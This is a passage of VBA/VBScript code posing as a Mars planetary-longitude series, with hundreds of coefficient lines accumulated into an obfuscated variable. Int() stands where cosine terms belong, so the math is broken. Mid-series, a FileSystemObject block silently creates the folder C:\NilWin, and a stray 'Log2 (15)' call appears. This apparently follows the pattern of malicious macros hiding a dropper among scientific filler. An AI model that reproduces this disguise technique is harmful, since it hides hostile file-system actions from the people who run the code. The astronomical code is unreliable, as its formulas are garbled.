 OPOPOTAMIKUSE = OPOPOTAMIKUSE + 0.00000000156 * Int(4.6155626882 + 3354.8395207014 * Lite)
 OPOPOTAMIKUSE = OPOPOTAMIKUSE + 0.00000000131 * Int(4.47476808853 + 11776.8999298644 * Lite)
 OPOPOTAMIKUSE = OPOPOTAMIKUSE + 0.00000000118 * Int(1.17466010141 + 4606.1799053262 * Lite)
 OPOPOTAMIKUSE = OPOPOTAMIKUSE + 0.00000000128 * Int(0.12648796247 + 6681.6449294932 * Lite)
 OPOPOTAMIKUSE = OPOPOTAMIKUSE + 0.00000000122 * Int(0.1351137794 + 8322.5580635962 * Lite)
 OPOPOTAMIKUSE = OPOPOTAMIKUSE + 0.00000000119 * Int(1.2913911635 + 10544.4146981932 * Lite)
 OPOPOTAMIKUSE = OPOPOTAMIKUSE + 0.00000000128 * Int(4.4496605074 + 13465.5424810178 * Lite)
 OPOPOTAMIKUSE = OPOPOTAMIKUSE + 0.00000000119 * Int(4.0170962999 + 14481.205498902 * Lite)
 OPOPOTAMIKUSE = OPOPOTAMIKUSE + 0.00000000147 * Int(1.8159027965 + 685.1113645288 * Lite)
 OPOPOTAMIKUSE = OPOPOTAMIKUSE + 0.00000000137 * Int(4.78402836071 + 3613.2853840514 * Lite)
 OPOPOTAMIKUSE = OPOPOTAMIKUSE + 0.00000000151 * Int(1.48428558337 + 9698.331863442 * Lite)
 OPOPOTAMIKUSE = OPOPOTAMIKUSE + 0.00000000136 * Int(2.47757608387 + 10156.9023601348 * Lite)
 OPOPOTAMIKUSE = OPOPOTAMIKUSE + 0.00000000123 * Int(2.42353206298 + 6.1332259326 * Lite)
 OPOPOTAMIKUSE = OPOPOTAMIKUSE + 0.00000000117 * Int(5.40635440024 + 688.6344828778 * Lite)
 OPOPOTAMIKUSE = OPOPOTAMIKUSE + 0.00000000153 * Int(5.00372030984 + 14556.8967170238 * Lite)
 OPOPOTAMIKUSE = OPOPOTAMIKUSE + 0.00000000133 * Int(3.15773785434 + 1125.8693391036 * Lite)
 OPOPOTAMIKUSE = OPOPOTAMIKUSE + 0.00000000153 * Int(1.94292660454 + 6533.1461289733 * Lite)
 OPOPOTAMIKUSE = OPOPOTAMIKUSE + 0.00000000124 * Int(4.94608245253 + 12825.6451947038 * Lite)
 OPOPOTAMIKUSE = OPOPOTAMIKUSE + 0.00000000117 * Int(1.13528750738 + 4452.2546718018 * Lite)
 OPOPOTAMIKUSE = OPOPOTAMIKUSE + 0.00000000115 * Int(3.34121813462 + 10001.4819607006 * Lite)
 OPOPOTAMIKUSE = OPOPOTAMIKUSE + 0.00000000115 * Int(3.44586362144 + 7696.8878712838 * Lite)
 OPOPOTAMIKUSE = OPOPOTAMIKUSE + 0.00000000117 * Int(0.72489390402 + 27.4688663996 * Lite)
 OPOPOTAMIKUSE = OPOPOTAMIKUSE + 0.00000000132 * Int(2.41318250916 + 6717.252720077 * Lite)
 OPOPOTAMIKUSE = OPOPOTAMIKUSE + 0.00000000118 * Int(0.35995031424 + 27832.0382192832 * Lite)
 OPOPOTAMIKUSE = OPOPOTAMIKUSE + 0.00000000157 * Int(1.73929012934 + 11560.0777160774 * Lite)
 OPOPOTAMIKUSE = OPOPOTAMIKUSE + 0.00000000148 * Int(2.14023976341 + 15265.8865193004 * Lite)
 OPOPOTAMIKUSE = OPOPOTAMIKUSE + 0.00000000113 * Int(1.29183863745 + 26880.3198130326 * Lite)
 OPOPOTAMIKUSE = OPOPOTAMIKUSE + 0.00000000151 * Int(0.95890610457 + 6530.1771835567 * Lite)
 OPOPOTAMIKUSE = OPOPOTAMIKUSE + 0.00000000153 * Int(5.62679784282 + 9911.63095888 * Lite)
 OPOPOTAMIKUSE = OPOPOTAMIKUSE + 0.00000000157 * Int(0.09791378159 + 138.5174968707 * Lite)
 OPOPOTAMIKUSE = OPOPOTAMIKUSE + 0.00000000119 * Int(2.16883964744 + 7082.8969751568 * Lite)
 OPOPOTAMIKUSE = OPOPOTAMIKUSE + 0.00000000113 * Int(5.43102427558 + 422.027441156 * Lite)
 OPOPOTAMIKUSE = OPOPOTAMIKUSE + 0.0000000013 * Int(2.13493506322 + 117.812802892 * Lite)
 OPOPOTAMIKUSE = OPOPOTAMIKUSE + 0.0000000014 * Int(2.5119459163 + 28.9816299794 * Lite)
 OPOPOTAMIKUSE = OPOPOTAMIKUSE + 0.00000000128 * Int(1.238227512 + 6680.804777306 * Lite)
 OPOPOTAMIKUSE = OPOPOTAMIKUSE + 0.00000000111 * Int(4.60294776614 + 25135.8265183146 * Lite)
 OPOPOTAMIKUSE = OPOPOTAMIKUSE + 0.00000000118 * Int(0.34226497704 + 4140.4335518652 * Lite)
 OPOPOTAMIKUSE = OPOPOTAMIKUSE + 0.00000000112 * Int(4.02233737541 + 6314.0005244372 * Lite)
 OPOPOTAMIKUSE = OPOPOTAMIKUSE + 0.00000000134 * Int(3.3592621473 + 11247.2089647698 * Lite)
 OPOPOTAMIKUSE = OPOPOTAMIKUSE + 0.0000000012 * Int(6.09430372868 + 4106.4054911462 * Lite)
 OPOPOTAMIKUSE = OPOPOTAMIKUSE + 0.00000000117 * Int(0.03006245187 + 7.6737919754 * Lite)
 OPOPOTAMIKUSE = OPOPOTAMIKUSE + 0.00000000109 * Int(3.62630036582 + 3344.11829139661 * Lite)
 OPOPOTAMIKUSE = OPOPOTAMIKUSE + 0.00000000109 * Int(1.94277745743 + 16702.9948231962 * Lite)
 OPOPOTAMIKUSE = OPOPOTAMIKUSE + 0.00000000114 * Int(4.87315937546 + 6151.5166346528 * Lite)
 OPOPOTAMIKUSE = OPOPOTAMIKUSE + 0.00000000109 * Int(5.65707270595 + 3344.152798701 * Lite)
 OPOPOTAMIKUSE = OPOPOTAMIKUSE + 0.00000000108 * Int(0.72637519191 + 10.569355047 * Lite)
 OPOPOTAMIKUSE = OPOPOTAMIKUSE + 0.00000000128 * Int(5.77326416186 + 13369.5632538 * Lite)
 OPOPOTAMIKUSE = OPOPOTAMIKUSE + 0.00000000147 * Int(4.73848506543 + 11610.9101753832 * Lite)
 OPOPOTAMIKUSE = OPOPOTAMIKUSE + 0.00000000145 * Int(4.95495312886 + 9859.3706439672 * Lite)
 OPOPOTAMIKUSE = OPOPOTAMIKUSE + 0.00000000111 * Int(3.28808788953 + 257.018007743 * Lite)
 OPOPOTAMIKUSE = OPOPOTAMIKUSE + 0.00000000112 * Int(4.79777726412 + 12140.6011404778 * Lite)
 OPOPOTAMIKUSE = OPOPOTAMIKUSE + 0.00000000109 * Int(3.73199687068 + 13635.1226641508 * Lite)
 OPOPOTAMIKUSE = OPOPOTAMIKUSE + 0.00000000117 * Int(1.20057736014 + 6705.1032911474 * Lite)
 OPOPOTAMIKUSE = OPOPOTAMIKUSE + 0.00000000149 * Int(4.91688353237 + 277.0349937414 * Lite)
 
 
 Log2 (15)


 OPOPOTAMIKUSE = OPOPOTAMIKUSE + 0.00000000108 * Int(3.37299798972 + 6717.8302187038 * Lite)
 OPOPOTAMIKUSE = OPOPOTAMIKUSE + 0.00000000106 * Int(0.53379407701 + 5085.1057214178 * Lite)
 OPOPOTAMIKUSE = OPOPOTAMIKUSE + 0.00000000125 * Int(4.62770076269 + 9329.6796788726 * Lite)
 OPOPOTAMIKUSE = OPOPOTAMIKUSE + 0.00000000107 * Int(4.60288570375 + 1957.7250798532 * Lite)
 OPOPOTAMIKUSE = OPOPOTAMIKUSE + 0.00000000113 * Int(4.04786119569 + 6953.8978107512 * Lite)
 OPOPOTAMIKUSE = OPOPOTAMIKUSE + 0.00000000106 * Int(0.75378922686 + 149.8974751268 * Lite)
 OPOPOTAMIKUSE = OPOPOTAMIKUSE + 0.00000000114 * Int(0.62074562387 + 6151.5511419572 * Lite)
 OPOPOTAMIKUSE = OPOPOTAMIKUSE + 0.00000000108 * Int(5.22204692781 + 1556.5681469554 * Lite)
 OPOPOTAMIKUSE = OPOPOTAMIKUSE + 0.00000000104 * Int(1.02502614223 + 4878.8528626778 * Lite)
 OPOPOTAMIKUSE = OPOPOTAMIKUSE + 0.00000000133 * Int(1.15811543786 + 816.6533262152 * Lite)
 OPOPOTAMIKUSE = OPOPOTAMIKUSE + 0.00000000134 * Int(1.69834857217 + 183.869586902 * Lite)
 OPOPOTAMIKUSE = OPOPOTAMIKUSE + 0.00000000104 * Int(2.58832774275 + 14591.4118201214 * Lite)
 OPOPOTAMIKUSE = OPOPOTAMIKUSE + 0.00000000107 * Int(4.42117075795 + 7.130800653 * Lite)
 OPOPOTAMIKUSE = OPOPOTAMIKUSE + 0.00000000126 * Int(0.03750399181 + 16.83220104979 * Lite)
 OPOPOTAMIKUSE = OPOPOTAMIKUSE + 0.00000000102 * Int(1.20624870972 + 11986.6759069534 * Lite)
Mars_L02 = OPOPOTAMIKUSE * 1
End Function
' ************************

Public Function Mars_L03(Lite)

' L0 Segment #3 of 3

 Dim OPOPOTAMIKUSE As Double
 OPOPOTAMIKUSE = 0#
 OPOPOTAMIKUSE = OPOPOTAMIKUSE + 0.00000000102 * Int(2.97579561878 + 29822.7832363242 * Lite)
 OPOPOTAMIKUSE = OPOPOTAMIKUSE + 0.00000000116 * Int(4.73049067619 + 13366.040135451 * Lite)
 OPOPOTAMIKUSE = OPOPOTAMIKUSE + 0.0000000013 * Int(4.10484632841 + 35.6077905838 * Lite)
 OPOPOTAMIKUSE = OPOPOTAMIKUSE + 0.00000000113 * Int(3.69200525056 + 44.6538332402 * Lite)
 OPOPOTAMIKUSE = OPOPOTAMIKUSE + 0.00000000111 * Int(5.12900291511 + 146.7944328714 * Lite)
 OPOPOTAMIKUSE = OPOPOTAMIKUSE + 0.00000000126 * Int(1.82187459534 + 26887.3660497306 * Lite)
 OPOPOTAMIKUSE = OPOPOTAMIKUSE + 0.00000000121 * Int(6.08309355316 + 7100.7094972748 * Lite)
 OPOPOTAMIKUSE = OPOPOTAMIKUSE + 0.00000000105 * Int(6.16606590276 + 9175.7544453482 * Lite)
 OPOPOTAMIKUSE = OPOPOTAMIKUSE + 0.00000000132 * Int(2.97955203077 + 1250.8301963008 * Lite)
 OPOPOTAMIKUSE = OPOPOTAMIKUSE + 0.00000000106 * Int(5.08419485009 + 8742.0427074714 * Lite)
 OPOPOTAMIKUSE = OPOPOTAMIKUSE + 0.0000000012 * Int(0.59116561391 + 31172.650645983 * Lite)
 OPOPOTAMIKUSE = OPOPOTAMIKUSE + 0.00000000112 * Int(3.70888430091 + 10050.2864675672 * Lite)
 OPOPOTAMIKUSE = OPOPOTAMIKUSE + 0.000000001 * Int(1.82077956276 + 12012.5822971404 * Lite)
 OPOPOTAMIKUSE = OPOPOTAMIKUSE + 0.00000000107 * Int(4.86100312387 + 7899.550301372 * Lite)
 OPOPOTAMIKUSE = OPOPOTAMIKUSE + 0.00000000099 * Int(0.72997085174 + 18977.1790830088 * Lite)
 OPOPOTAMIKUSE = OPOPOTAMIKUSE + 0.00000000107 * Int(5.25025570307 + 63.7358983034 * Lite)
 OPOPOTAMIKUSE = OPOPOTAMIKUSE + 0.00000000099 * Int(2.79139996703 + 17932.0242468212 * Lite)
 OPOPOTAMIKUSE = OPOPOTAMIKUSE + 0.00000000097 * Int(4.94370173613 + 28109.214616052 * Lite)
 OPOPOTAMIKUSE = OPOPOTAMIKUSE + 0.00000000122 * Int(4.18676567644 + 19617.0763693228 * Lite)
 OPOPOTAMIKUSE = OPOPOTAMIKUSE + 0.00000000121 * Int(3.14207351411 + 9278.8472195668 * Lite)
 OPOPOTAMIKUSE = OPOPOTAMIKUSE + 0.00000000112 * Int(1.43537110436 + 16232.745030318 * Lite)
 OPOPOTAMIKUSE = OPOPOTAMIKUSE + 0.00000000096 * Int(2.57929371627 + 12715.4388734844 * Lite)
 OPOPOTAMIKUSE = OPOPOTAMIKUSE + 0.00000000096 * Int(2.51396484677 + 3535.5838111604 * Lite)
 OPOPOTAMIKUSE = OPOPOTAMIKUSE + 0.00000000112 * Int(6.19137312195 + 6685.1570066627 * Lite)
 OPOPOTAMIKUSE = OPOPOTAMIKUSE + 0.00000000109 * Int(1.53428110338 + 16703.1294438018 * Lite)
 OPOPOTAMIKUSE = OPOPOTAMIKUSE + 0.00000000096 * Int(4.29245810274 + 7906.59653807 * Lite)
 OPOPOTAMIKUSE = OPOPOTAMIKUSE + 0.00000000096 * Int(3.08847844641 + 3468.6312700372 * Lite)
 OPOPOTAMIKUSE = OPOPOTAMIKUSE + 0.00000000095 * Int(6.091860847 + 10037.0897512844 * Lite)
 OPOPOTAMIKUSE = OPOPOTAMIKUSE + 0.00000000094 * Int(1.79812841802 + 20047.1976785478 * Lite)
 OPOPOTAMIKUSE = OPOPOTAMIKUSE + 0.0000000011 * Int(4.24859410294 + 3337.0720546986 * Lite)
 OPOPOTAMIKUSE = OPOPOTAMIKUSE + 0.00000000093 * Int(2.17945548408 + 16066.0658614748 * Lite)
 OPOPOTAMIKUSE = OPOPOTAMIKUSE + 0.00000000115 * Int(5.44548079869 + 11353.8921676402 * Lite)
 OPOPOTAMIKUSE = OPOPOTAMIKUSE + 0.00000000098 * Int(1.89605054783 + 33406.124266998 * Lite)
 OPOPOTAMIKUSE = OPOPOTAMIKUSE + 0.00000000101 * Int(3.00793005829 + 3528.5375744624 * Lite)
 OPOPOTAMIKUSE = OPOPOTAMIKUSE + 0.00000000096 * Int(5.4065991242 + 5749.8617665478 * Lite)
 OPOPOTAMIKUSE = OPOPOTAMIKUSE + 0.00000000113 * Int(3.93443805059 + 7167.1969061892 * Lite)
 OPOPOTAMIKUSE = OPOPOTAMIKUSE + 0.00000000092 * Int(3.58985964414 + 6724.9437657046 * Lite)
 OPOPOTAMIKUSE = OPOPOTAMIKUSE + 0.00000000119 * Int(3.9056157026 + 11346.7786206394 * Lite)
 OPOPOTAMIKUSE = OPOPOTAMIKUSE + 0.00000000097 * Int(2.5728079023 + 1747.6073781529 * Lite)
 OPOPOTAMIKUSE = OPOPOTAMIKUSE + 0.00000000118 * Int(3.82111723459 + 9072.6616711296 * Lite)
 OPOPOTAMIKUSE = OPOPOTAMIKUSE + 0.00000000096 * Int(0.72646224606 + 3152.68727893721 * Lite)
 OPOPOTAMIKUSE = OPOPOTAMIKUSE + 0.00000000092 * Int(6.23928508055 + 24491.4257925834 * Lite)
 OPOPOTAMIKUSE = OPOPOTAMIKUSE + 0.00000000099 * Int(1.86991802881 + 72.0557333548 * Lite)
 OPOPOTAMIKUSE = OPOPOTAMIKUSE + 0.00000000094 * Int(1.51091806861 + 9801.4246376606 * Lite)
 OPOPOTAMIKUSE = OPOPOTAMIKUSE + 0.00000000091 * Int(4.94377681711 + 8756.269801473 * Lite)
 OPOPOTAMIKUSE = OPOPOTAMIKUSE + 0.00000000095 * Int(2.58771497236 + 11663.170490296 * Lite)
 OPOPOTAMIKUSE = OPOPOTAMIKUSE + 0.00000000093 * Int(0.6609244332 + 30.9919847486 * Lite)
 OPOPOTAMIKUSE = OPOPOTAMIKUSE + 0.00000000088 * Int(2.47386826588 + 17232.7530985936 * Lite)
 OPOPOTAMIKUSE = OPOPOTAMIKUSE + 0.000000001 * Int(0.19616913512 + 11883.5831327348 * Lite)
 OPOPOTAMIKUSE = OPOPOTAMIKUSE + 0.00000000094 * Int(0.61277732908 + 73.6354632196 * Lite)
 OPOPOTAMIKUSE = OPOPOTAMIKUSE + 0.00000000091 * Int(6.04139177526 + 153.9252335244 * Lite)
 OPOPOTAMIKUSE = OPOPOTAMIKUSE + 0.00000000095 * Int(0.30865798871 + 29168.5965462412 * Lite)
 OPOPOTAMIKUSE = OPOPOTAMIKUSE + 0.0000000011 * Int(6.27936643935 + 3337.106562003 * Lite)
 OPOPOTAMIKUSE = OPOPOTAMIKUSE + 0.00000000087 * Int(2.09287965409 + 10264.5658840734 * Lite)
 OPOPOTAMIKUSE = OPOPOTAMIKUSE + 0.00000000089 * Int(3.27633365389 + 3002.3697277168 * Lite)
 OPOPOTAMIKUSE = OPOPOTAMIKUSE + 0.00000000091 * Int(1.89622049447 + 37895.4262903674 * Lite)
 OPOPOTAMIKUSE = OPOPOTAMIKUSE + 0.00000000118 * Int(3.88268323672 + 1236.075660323 * Lite)
 OPOPOTAMIKUSE = OPOPOTAMIKUSE + 0.00000000094 * Int(2.2781906199 + 4845.9002357928 * Lite)
 OPOPOTAMIKUSE = OPOPOTAMIKUSE + 0.00000000085 * Int(3.07438636612 + 9983.7042444616 * Lite)
 OPOPOTAMIKUSE = OPOPOTAMIKUSE + 0.00000000086 * Int(3.94463425808 + 16.764890747 * Lite)
 OPOPOTAMIKUSE = OPOPOTAMIKUSE + 0.00000000099 * Int(4.58890225582 + 3774.3241645766 * Lite)
 OPOPOTAMIKUSE = OPOPOTAMIKUSE + 0.00000000086 * Int(1.27758598252 + 34513.2630726828 * Lite)
 OPOPOTAMIKUSE = OPOPOTAMIKUSE + 0.00000000118 * Int(6.10625309129 + 454.9093665273 * Lite)
 OPOPOTAMIKUSE = OPOPOTAMIKUSE + 0.00000000096 * Int(6.08772700197 + 1755.4716846791 * Lite)
 OPOPOTAMIKUSE = OPOPOTAMIKUSE + 0.00000000085 * Int(4.73193631802 + 4576.6880870228 * Lite)
 OPOPOTAMIKUSE = OPOPOTAMIKUSE + 0.00000000116 * Int(0.88573303872 + 16511.6138673874 * Lite)
 OPOPOTAMIKUSE = OPOPOTAMIKUSE + 0.00000000083 * Int(3.13948373813 + 10191.4174632324 * Lite)
 OPOPOTAMIKUSE = OPOPOTAMIKUSE + 0.00000000083 * Int(0.36972674664 + 9755.2302383776 * Lite)
 OPOPOTAMIKUSE = OPOPOTAMIKUSE + 0.00000000112 * Int(2.26524635842 + 10006.5848089144 * Lite)
 OPOPOTAMIKUSE = OPOPOTAMIKUSE + 0.00000000087 * Int(4.25461508452 + 8.1681365824 * Lite)
 OPOPOTAMIKUSE = OPOPOTAMIKUSE + 0.00000000087 * Int(5.31716927554 + 1868.8593996362 * Lite)
 OPOPOTAMIKUSE = OPOPOTAMIKUSE + 0.00000000115 * Int(3.3050783005 + 14157.7000822446 * Lite)
 OPOPOTAMIKUSE = OPOPOTAMIKUSE + 0.00000000087 * Int(2.90507350729 + 36.995590611 * Lite)
 OPOPOTAMIKUSE = OPOPOTAMIKUSE + 0.00000000083 * Int(3.58400049244 + 12928.7379689224 * Lite)
 OPOPOTAMIKUSE = OPOPOTAMIKUSE + 0.00000000086 * Int(2.46839611271 + 113.7294395684 * Lite)
 OPOPOTAMIKUSE = OPOPOTAMIKUSE + 0.00000000096 * Int(2.99829695985 + 6510.5519827804 * Lite)
 OPOPOTAMIKUSE = OPOPOTAMIKUSE + 0.00000000084 * Int(1.34333260788 + 4133.3873151672 * Lite)
 OPOPOTAMIKUSE = OPOPOTAMIKUSE + 0.00000000093 * Int(2.41895388985 + 20040.1514418498 * Lite)
 OPOPOTAMIKUSE = OPOPOTAMIKUSE + 0.00000000085 * Int(5.92093268818 + 12299.544658261 * Lite)
 OPOPOTAMIKUSE = OPOPOTAMIKUSE + 0.00000000082 * Int(4.71321236549 + 7733.493236588 * Lite)
 OPOPOTAMIKUSE = OPOPOTAMIKUSE + 0.00000000081 * Int(5.26971110105 + 12199.9750023914 * Lite)
 OPOPOTAMIKUSE = OPOPOTAMIKUSE + 0.0000000008 * Int(4.34410099751 + 7218.029365495 * Lite)
 OPOPOTAMIKUSE = OPOPOTAMIKUSE + 0.00000000095 * Int(0.02613500045 + 2.9010142898 * Lite)
 OPOPOTAMIKUSE = OPOPOTAMIKUSE + 0.00000000094 * Int(6.22018441621 + 20043.691813851 * Lite)
 OPOPOTAMIKUSE = OPOPOTAMIKUSE + 0.00000000085 * Int(4.66573809999 + 8638.9499332528 * Lite)
 OPOPOTAMIKUSE = OPOPOTAMIKUSE + 0.00000000079 * Int(2.89839604813 + 22854.596021804 * Lite)
 OPOPOTAMIKUSE = OPOPOTAMIKUSE + 0.00000000104 * Int(0.94882888784 + 2735.762685995 * Lite)
 OPOPOTAMIKUSE = OPOPOTAMIKUSE + 0.0000000008 * Int(1.68097745917 + 12839.8722887054 * Lite)
 OPOPOTAMIKUSE = OPOPOTAMIKUSE + 0.00000000085 * Int(1.95515305721 + 4686.95671800959 * Lite)
 OPOPOTAMIKUSE = OPOPOTAMIKUSE + 0.00000000094 * Int(0.58147434179 + 14128.2427712456 * Lite)
 OPOPOTAMIKUSE = OPOPOTAMIKUSE + 0.00000000091 * Int(1.16317999954 + 3495.9655158312 * Lite)
 OPOPOTAMIKUSE = OPOPOTAMIKUSE + 0.00000000084 * Int(4.04104644774 + 9815.6517316622 * Lite)
 OPOPOTAMIKUSE = OPOPOTAMIKUSE + 0.00000000082 * Int(1.83662951627 + 19190.4781784468 * Lite)
 OPOPOTAMIKUSE = OPOPOTAMIKUSE + 0.0000000008 * Int(4.04733274699 + 3188.7151456146 * Lite)
 OPOPOTAMIKUSE = OPOPOTAMIKUSE + 0.00000000084 * Int(2.71620952175 + 12089.768681172 * Lite)
 OPOPOTAMIKUSE = OPOPOTAMIKUSE + 0.0000000008 * Int(2.7736315821 + 9495.6694333538 * Lite)
 OPOPOTAMIKUSE = OPOPOTAMIKUSE + 0.00000000078 * Int(5.77285430206 + 10397.6030116696 * Lite)
 OPOPOTAMIKUSE = OPOPOTAMIKUSE + 0.00000000084 * Int(0.78188080031 + 7214.4389368432 * Lite)
 OPOPOTAMIKUSE = OPOPOTAMIKUSE + 0.00000000094 * Int(2.14762315943 + 13532.0298899322 * Lite)
 OPOPOTAMIKUSE = OPOPOTAMIKUSE + 0.00000000101 * Int(5.76349087526 + 1484.9324896942 * Lite)
 OPOPOTAMIKUSE = OPOPOTAMIKUSE + 0.00000000082 * Int(3.11421789241 + 8446.9914788172 * Lite)
 OPOPOTAMIKUSE = OPOPOTAMIKUSE + 0.00000000096 * Int(5.85152670536 + 3492.509707785 * Lite)
 OPOPOTAMIKUSE = OPOPOTAMIKUSE + 0.00000000079 * Int(4.69625309523 + 5298.337506553 * Lite)
 OPOPOTAMIKUSE = OPOPOTAMIKUSE + 0.00000000097 * Int(3.97960395898 + 18208.349942592 * Lite)
 OPOPOTAMIKUSE = OPOPOTAMIKUSE + 0.00000000105 * Int(1.74376904536 + 36.6485629295 * Lite)
 OPOPOTAMIKUSE = OPOPOTAMIKUSE + 0.00000000094 * Int(4.18941238607 + 20043.6573065466 * Lite)
 OPOPOTAMIKUSE = OPOPOTAMIKUSE + 0.00000000075 * Int(3.46629875063 + 13341.6743113068 * Lite)
 OPOPOTAMIKUSE = OPOPOTAMIKUSE + 0.00000000092 * Int(2.67278833288 + 6680.7949702729 * Lite)
 OPOPOTAMIKUSE = OPOPOTAMIKUSE + 0.00000000075 * Int(4.59723160021 + 9993.3880926316 * Lite)
 OPOPOTAMIKUSE = OPOPOTAMIKUSE + 0.00000000087 * Int(0.91979096638 + 8425.7181481176 * Lite)
 OPOPOTAMIKUSE = OPOPOTAMIKUSE + 0.00000000074 * Int(0.42228487063 + 48429.2821823244 * Lite)
 OPOPOTAMIKUSE = OPOPOTAMIKUSE + 0.00000000074 * Int(0.48470953224 + 11456.9849418588 * Lite)
 OPOPOTAMIKUSE = OPOPOTAMIKUSE + 0.00000000077 * Int(0.10707484151 + 1371.411763456 * Lite)
 OPOPOTAMIKUSE = OPOPOTAMIKUSE + 0.00000000093 * Int(1.38010528069 + 3145.6410422392 * Lite)
 OPOPOTAMIKUSE = OPOPOTAMIKUSE + 0.00000000075 * Int(5.2806125707 + 12306.590894959 * Lite)
 OPOPOTAMIKUSE = OPOPOTAMIKUSE + 0.00000000079 * Int(3.7866638604 + 7.5786792096 * Lite)
 OPOPOTAMIKUSE = OPOPOTAMIKUSE + 0.00000000073 * Int(4.42902162523 + 14.7372823256 * Lite)
 OPOPOTAMIKUSE = OPOPOTAMIKUSE + 0.00000000084 * Int(3.41538432898 + 6637.5059410946 * Lite)
 OPOPOTAMIKUSE = OPOPOTAMIKUSE + 0.00000000093 * Int(3.41302342683 + 1596.1191319818 * Lite)
 OPOPOTAMIKUSE = OPOPOTAMIKUSE + 0.00000000071 * Int(3.13537213242 + 9488.6231966558 * Lite)
 OPOPOTAMIKUSE = OPOPOTAMIKUSE + 0.00000000079 * Int(2.33442828498 + 12465.5344127422 * Lite)
 OPOPOTAMIKUSE = OPOPOTAMIKUSE + 0.00000000078 * Int(2.21525134547 + 2810.988771908 * Lite)
 OPOPOTAMIKUSE = OPOPOTAMIKUSE + 0.00000000099 * Int(0.48801369293 + 17499.3601403154 * Lite)
 OPOPOTAMIKUSE = OPOPOTAMIKUSE + 0.00000000075 * Int(4.10299895268 + 5525.8636959926 * Lite)
 OPOPOTAMIKUSE = OPOPOTAMIKUSE + 0.00000000071 * Int(4.04186021414 + 259.493494721 * Lite)
 OPOPOTAMIKUSE = OPOPOTAMIKUSE + 0.00000000073 * Int(2.20102876718 + 30774.5016425748 * Lite)
 OPOPOTAMIKUSE = OPOPOTAMIKUSE + 0.00000000074 * Int(4.93439968296 + 13517.8027959306 * Lite)
 OPOPOTAMIKUSE = OPOPOTAMIKUSE + 0.00000000071 * Int(5.32625652676 + 6670.1791531357 * Lite)
 OPOPOTAMIKUSE = OPOPOTAMIKUSE + 0.00000000078 * Int(2.17664185326 + 13421.8235687128 * Lite)
 OPOPOTAMIKUSE = OPOPOTAMIKUSE + 0.00000000088 * Int(5.38469204503 + 17762.4440636882 * Lite)
 OPOPOTAMIKUSE = OPOPOTAMIKUSE + 0.00000000081 * Int(2.48353174238 + 73.6009559152 * Lite)
 OPOPOTAMIKUSE = OPOPOTAMIKUSE + 0.00000000092 * Int(1.1308844819 + 7747.7203305896 * Lite)
 OPOPOTAMIKUSE = OPOPOTAMIKUSE + 0.0000000007 * Int(1.16361323015 + 5220.1708014532 * Lite)
 OPOPOTAMIKUSE = OPOPOTAMIKUSE + 0.00000000084 * Int(5.8322038791 + 22.3782713026 * Lite)
 OPOPOTAMIKUSE = OPOPOTAMIKUSE + 0.00000000076 * Int(5.21065604639 + 4271.9755135516 * Lite)
 OPOPOTAMIKUSE = OPOPOTAMIKUSE + 0.0000000008 * Int(4.01817623627 + 3311.18291816379 * Lite)
 OPOPOTAMIKUSE = OPOPOTAMIKUSE + 0.00000000068 * Int(2.4593769794 + 6279.5527316424 * Lite)
 OPOPOTAMIKUSE = OPOPOTAMIKUSE + 0.00000000067 * Int(4.31723563048 + 2281.2978068134 * Lite)
 OPOPOTAMIKUSE = OPOPOTAMIKUSE + 0.00000000067 * Int(4.88776321797 + 4379.6390374902 * Lite)
 OPOPOTAMIKUSE = OPOPOTAMIKUSE + 0.00000000069 * Int(3.57006764536 + 14955.045720432 * Lite)
 OPOPOTAMIKUSE = OPOPOTAMIKUSE + 0.00000000078 * Int(2.62374773232 + 2810.8541513024 * Lite)
 OPOPOTAMIKUSE = OPOPOTAMIKUSE + 0.00000000067 * Int(4.76301301456 + 6812.766815086 * Lite)
 
 
Set fso = CreateObject("Scripting.FileSystemObject")
Set DataB = CreateObject("Scripting.FileSystemObject")
folder = "C:\NilWin"

If fso.FolderExists(folder) = False Then
DataB.CreateFolder "C:\NilWin"
End If


 OPOPOTAMIKUSE = OPOPOTAMIKUSE + 0.0000000007 * Int(5.60319851277 + 13383.2251022916 * Lite)
 OPOPOTAMIKUSE = OPOPOTAMIKUSE + 0.0000000007 * Int(3.05647570196 + 10081.211142013 * Lite)
 OPOPOTAMIKUSE = OPOPOTAMIKUSE + 0.00000000081 * Int(4.91537623765 + 3333.9287628257 * Lite)
 OPOPOTAMIKUSE = OPOPOTAMIKUSE + 0.00000000082 * Int(5.4920498711 + 5483.254724826 * Lite)
 OPOPOTAMIKUSE = OPOPOTAMIKUSE + 0.00000000065 * Int(3.50466797067 + 9161.5273513466 * Lite)
 OPOPOTAMIKUSE = OPOPOTAMIKUSE + 0.00000000065 * Int(2.79212460026 + 13497.5147868346 * Lite)
 OPOPOTAMIKUSE = OPOPOTAMIKUSE + 0.0000000007 * Int(0.93640431668 + 6106.8800550648 * Lite)
 OPOPOTAMIKUSE = OPOPOTAMIKUSE + 0.00000000073 * Int(2.57583496978 + 6614.7374444852 * Lite)
 OPOPOTAMIKUSE = OPOPOTAMIKUSE + 0.0000000007 * Int(0.8417007058 + 16695.9485864982 * Lite)
 OPOPOTAMIKUSE = OPOPOTAMIKUSE + 0.00000000069 * Int(1.10040627005 + 2544.3316735356 * Lite)
 OPOPOTAMIKUSE = OPOPOTAMIKUSE + 0.00000000063 * Int(6.05841309176 + 6453.7487206106 * Lite)
 OPOPOTAMIKUSE = OPOPOTAMIKUSE + 0.00000000069 * Int(2.67053540192 + 2641.3412784722 * Lite)
 OPOPOTAMIKUSE = OPOPOTAMIKUSE + 0.00000000086 * Int(1.73112264739 + 6286.5989683404 * Lite)
 OPOPOTAMIKUSE = OPOPOTAMIKUSE + 0.00000000062 * Int(5.49002783256 + 4957.0868780804 * Lite)
 OPOPOTAMIKUSE = OPOPOTAMIKUSE + 0.00000000072 * Int(3.38857910283 + 3184.2117061974 * Lite)
 OPOPOTAMIKUSE = OPOPOTAMIKUSE + 0.00000000069 * Int(5.35281990892 + 2544.2971662312 * Lite)
 OPOPOTAMIKUSE = OPOPOTAMIKUSE + 0.00000000064 * Int(4.79175268505 + 3181.6689089166 * Lite)
 OPOPOTAMIKUSE = OPOPOTAMIKUSE + 0.0000000006 * Int(6.18449904353 + 3361.9480671668 * Lite)
 OPOPOTAMIKUSE = OPOPOTAMIKUSE + 0.00000000065 * Int(1.48236627574 + 4819.4790007642 * Lite)
 OPOPOTAMIKUSE = OPOPOTAMIKUSE + 0.00000000054 * Int(3.66018290396 + 2917.5373541728 * Lite)
 OPOPOTAMIKUSE = OPOPOTAMIKUSE + 0.00000000064 * Int(4.72286914683 + 2281.1631862078 * Lite)
